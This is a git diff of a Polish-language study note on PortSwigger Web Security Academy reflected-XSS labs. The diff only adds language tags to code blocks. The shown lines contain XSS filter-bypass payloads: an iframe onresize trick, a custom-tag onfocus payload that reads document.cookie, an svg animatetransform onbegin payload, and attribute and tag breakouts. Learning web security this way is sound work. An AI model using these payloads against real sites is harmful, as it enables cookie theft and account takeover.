@@ -149,12 +149,12 @@ Lab: Reflected XSS into HTML context with most tags and attributes blocked
 5. Teraz należy wysłać payload do ofiary:
 - konstruujemy iframe, który od razu po załadowaniu zmienia szerokość, a zatem wywołuje onresize
 
-```
+```html
 <iframe src="https://0aff008804477d86c05a1924003d00c4.web-security-academy.net/?search=<body onresize=print()>" onload=width='200px'>
 ```
 
 ## Lab: Reflected XSS into HTML context with all tags blocked except custom ones ->> TODO
-```
+```javascript
 <script>
 location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 </script>
@@ -164,11 +164,11 @@ location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+o
 1. enumerujemy po tagach i eventach
 2. dostępny jest tylko event onbegin i tagi svg, image, title, animatetransform
 3. z tego tworzymy: 
-```
+```html
 <svg><animatetransform onbegin=alert(1)>
 ```
 Jeśli jesteśmy wewnątrz skryptu:
-```
+```html
 " autofocus onfocus=alert(document.domain) x="
 ```
 Jeśli jesteśmy wewnątrz jakiegoś elementu np 
@@ -176,7 +176,7 @@ Jeśli jesteśmy wewnątrz jakiegoś elementu np
 
 
 src="[]"...>:
-```
+```html
 "><script>alert(document.domain)</script>
 ```
 Jeśli jesteśmy wewnątrz stringa w skrypcie:
